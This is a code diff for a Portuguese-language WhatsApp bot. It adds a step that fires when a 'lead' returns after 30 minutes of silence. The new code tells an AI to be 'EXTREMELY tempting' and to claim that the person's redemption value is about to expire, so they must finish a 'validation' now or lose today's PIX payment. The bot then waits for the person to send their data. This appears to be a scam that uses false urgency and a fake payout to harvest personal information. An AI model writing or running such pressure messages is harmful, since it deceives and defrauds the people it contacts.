@@ -120,11 +120,26 @@ client.on('message_create', async (msg) => {
         return;
     }
 
-    // 2. RESPOSTAS DO CLIENTE
+    // Processamento de mensagens recebidas (de leads)
     const session = chatSessions.get(chatId);
     if (!session || session.mode !== 'bot') return;
 
-    console.log(`📩 Resposta de ${chatId}: ${text}`);
+    // VERIFICAÇÃO DE REENGAJAMENTO (Se demorou mais de 30 minutos)
+    const now = Date.now();
+    const minutesAway = session.lastMsgTime ? Math.floor((now - session.lastMsgTime) / (1000 * 60)) : 0;
+    
+    if (minutesAway >= 30) {
+        console.log(`🔄 Lead ${chatId} voltou após ${minutesAway} min. Disparando reengajamento...`);
+        const reengagementMsg = await askAI("reengajamento_agressivo", `O usuário voltou após ${minutesAway} minutos de inatividade. Seja EXTREMAMENTE tentador, diga que o valor dele de resgate está quase expirando e que ele precisa terminar a validação AGORA para não perder o PIX de hoje.`);
+        await msg.reply(`👋 *Que bom que você retornou!*\n\n${reengagementMsg}`);
+        // Atualizamos o tempo para não repetir o reengajamento imediatamente
+        chatSessions.set(chatId, { ...session, lastMsgTime: now });
+        return; // Esperamos ele mandar o dado após o reengajamento
+    }
+
+    session.lastMsgTime = now; // Atualiza o tempo da última mensagem
+
+    console.log(`📩 Lead (${chatId}) respondeu: "${text}"`);
     const chat = await msg.getChat();
     await chat.sendStateTyping();
 
